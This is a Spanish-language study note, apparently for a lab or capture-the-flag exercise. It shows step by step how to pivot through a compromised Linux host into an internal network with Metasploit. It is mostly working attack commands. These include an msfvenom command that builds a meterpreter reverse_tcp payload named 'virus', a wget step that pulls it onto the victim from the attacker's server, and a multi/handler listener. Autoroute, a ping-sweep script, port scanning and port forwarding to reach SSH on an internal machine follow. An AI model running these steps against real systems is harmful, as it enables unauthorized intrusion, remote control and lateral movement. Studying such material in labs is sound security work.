
Primero debemos de reconocer en la red en la que se encuentra nuestra maquina.
`arp-scan -I eth0 --localnet`

Después de todo debemos de hacer la intrusión a la maquina. Una vez tenemos una shell estable debemos de crear en[[00. Apuntes/01. Herramientas/MSFVENOM|MSFVENOM]] un payload que nos de una sesión de meterpreter en [[METASPLOIT]].
El payload es el siguiente.
`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP_Atcante> LPORT=4444 -f elf -b '\x00\x0a\x0d' -o virus`

Una vez lo tengamos nos lo compartimos con la maquina victima, levantamos un servidor en Python.
`python3 -m http.server 80`

Y en la maquina victima usamos wget para obtener el fichero.
`wget <IP_Atacante>/virus`

En la maquina atacante debemos de abrir el [[METASPLOIT]] para poder recibir la sesión de meterpreter.
Usaremos el modulo de MultiHandler.
`use /multi/handler`
Configuramos los siguientes parámetros.
`set LHOST <IP_Atacante>`
`set LPORT <Puerto_Configurado_MSFVENOM>`
`set PAYLOAD linux/x86/meterpreter/reverse_tcp`

En la maquina intermedia debemos dar permisos de ejecución al archivo `virus` usaremos el comando `chmod +x virus`.
antes debemos de escalar privilegios en la maquina intermediaria para ser root.
Una vez hallamos escalado privilegios usamos el comando `./virus` para ejecutar el payload mientras en la maquina atacante esta corriendo el modulo que nos dará una sesión de meterpreter.

Una vez ya tenemos la intrusión de la maquina intermedia tenemos que ver que interfaces de red tiene con el comando `ipconfig`, pasamos la sesión de meterpreter a segundo plano con `ctrl + z`, para ver el id de sesión debemos usar `sessions -l`.

Usaremos el modulo para enrutar el trafico con el comando.
`use /multi/manage/autoroute`

Nos pide configurar el id de sesión, usaremos el comando `set SESSION <numero>`.
Ejecutamos el comando `run` para que se enrute el trafico.
Usaremos el comando `route` para ver la tabla de routing.

Ahora deberemos de conocer los hosts disponibles en la red interna. Tendremos que crear el siguiente script en bash, le llamaremos `scaner.sh`.
```` bash                                                               
#!/bin/bash

for i in {1..255}; do
        timeout 1 bash -c "ping -c 1 10.10.10.$i" >/dev/null
        if [ $? -eq 0 ]; then
                echo "El host 10.10.10.$i esta activo"
        fi
done

````

En el código hay que adaptar la IP a la que se le llama para hacer ping.
Ahora nos lo debemos compartir con un servidor de Python.
`python3 -m http.server 80`

Y en el [[METASPLOIT]] deberemos de ejecutar la sesión que teníamos suspendida con el comando.
`sessions -i <id>`

Con el comando `shell` ejecutamos el siguiente comando par atraernos el archivo.
`wget <IP_atacante>/scaner.sh`

Le tenemos que dar permisos de ejecución con el comando `chmod +x <nombre_archivo>`
Y una vez dado los permisos lo podemos ejecutar con el comando `./<nombre_archivo>`

Deberemos de probar el siguiente escaneo contra todas las maquinas, en este caso ya se sabe que maquina es asi que lo haremos solo hacia ella.

Volvemos a suspender la sesión de meterpreter con el comando `ctrl +z`
Debemos usar el modulo para hacer un escaneo de puertos.
`use scanner/portscan/tcp`

Vemos las opciones de configuración y configuramos los siguientes campos.
`set RHOST <IP_Maquina_RedInterna_Objetivo>`
Enjutamos el modulo con el comando `run`
*DEBEMOS DEJAR EL ESCANEO HASTA EL FINAL*

Ahora debemos hacer PortForwarding para que el puerto X de la maquina victuima vaya el puerto X de la maquina local.

Entramos en la sesión de meterpreter con el comando `sessions -i <id>`

`portfwd add -l 222 -p 22 -r <ip_victima>` Traer puerto 22 maquina victima al puerto 222 de la maquina local.

Ahora desde la maquina atacante podemos accedr por ssh usando el comando siguiente.
`ssh dimitri@127.0.0.1 -p 222`
- dimitri -> usuario ya conocido
- 127.0.0.1 -> localhost, porque hemos hecho portforwarding
- -p 222 -> puerto portforwarding

*TODOS LOS ATAQUES QUE SE QUIERAN HACER A ESA MAQUINA SE TIENE QUE USAR EL LOCALHOST CON EL PÙERTO CONFIGURADO*
